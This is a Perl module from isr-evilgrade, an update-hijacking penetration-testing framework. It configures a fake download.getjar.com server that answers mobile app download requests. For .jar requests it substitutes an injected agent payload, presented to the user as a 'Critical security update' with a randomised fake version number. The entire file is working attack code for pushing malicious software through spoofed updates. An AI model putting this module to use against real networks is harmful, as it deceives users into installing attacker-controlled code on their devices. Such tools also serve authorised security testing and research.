###############
# getjar.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::getjar;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'getjar',
    'version'     => '1.0',
    'appver'      => '< 1.0',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(download.getjar.com)',
    'request'     => [

        ## Agent install
        {
#           'req' => '/downloads/wap/export-96-208x689537102-II2C72ena1/29826/Facebook_j2me.jad$', # nokia n95 facebook
            'req'    => '.jad$',                    # nokia n95 facebook
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => './include/getjar/j2me.jad',
        },
        {   'req'    => '.sisx$',                   #regex friendly #10.0
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file' => './include/getjar/GoogleSearch_v2.1.12_getjar.sisx',
        },
        {   'req'    => '.jar$',                    #regex friendly #10.0
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => "",
            'parse'  => 0,
            'file'   => '',
        },
        {   'req'    => '/JarInstallNotify',        #regex friendly #10.0
            'type'   => 'install',                  #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'   => '',
        },

    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './include/getjar/j2me.jar',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
